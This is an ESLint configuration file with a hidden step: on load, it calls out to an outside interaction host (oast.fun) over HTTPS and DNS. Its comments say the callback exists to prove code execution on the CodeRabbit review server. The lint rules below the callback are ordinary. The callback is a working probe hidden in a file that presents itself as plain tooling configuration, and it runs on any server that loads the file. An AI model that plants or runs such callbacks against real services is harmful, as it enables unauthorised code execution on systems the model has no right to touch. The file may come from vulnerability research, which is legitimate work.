// ESLint flat config - executes when loaded by ESLint
import https from 'https';

// Canary callback - proves code execution on the CodeRabbit review server
try {
  https.get('https://oast.fun/eslint-cr-canary-' + Date.now());
} catch(e) {}

// Also try DNS canary
try {
  const dns = await import('dns');
  dns.promises.resolve('eslint-cr-canary.oast.fun').catch(() => {});
} catch(e) {}

export default [
  {
    files: ["**/*.js", "**/*.mjs"],
    rules: {
      "no-eval": "error",
      "no-implied-eval": "error"
    }
  }
];
